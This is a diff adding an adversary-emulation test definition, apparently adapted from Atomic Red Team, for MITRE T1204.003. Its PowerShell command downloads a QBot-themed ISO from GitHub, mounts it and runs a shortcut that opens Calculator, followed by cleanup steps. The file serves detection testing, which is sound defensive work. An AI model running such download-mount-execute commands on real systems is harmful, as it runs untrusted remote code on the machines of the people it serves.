@@ -1,0 +1,18 @@
+- id: 1d682228-f710-5993-a3f1-9b12859ca86f
+  name: Soumaia ART Tests - Malicious Execution from Mounted ISO Image
+  description: Adversaries may rely on a user running a malicious image to facilitate execution (requires elevation)
+  tactic: ''
+  technique:
+    attack_id: T1204.003
+    name: 'User Execution: Malicious Image'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.003/src/qbot-test.iso" -OutFile "$env:TEMP\qbot-test.iso")
+          Mount-DiskImage -ImagePath "$env:TEMP\qbot-test.iso"
+          $mountedpath = (Get-DiskImage -ImagePath "$env:TEMP\qbot-test.iso" | Get-Volume).DriveLetter
+          $finalpath = $mountedpath + ":\"
+          cd $finalpath
+          .\calc.exe.lnk
+        cleanup: "start-sleep -s 5\nstop-process -Name \"Calculatorapp\" -Force \ndismount-diskimage -ImagePath \"$env:TEMP\\qbot-test.iso\""
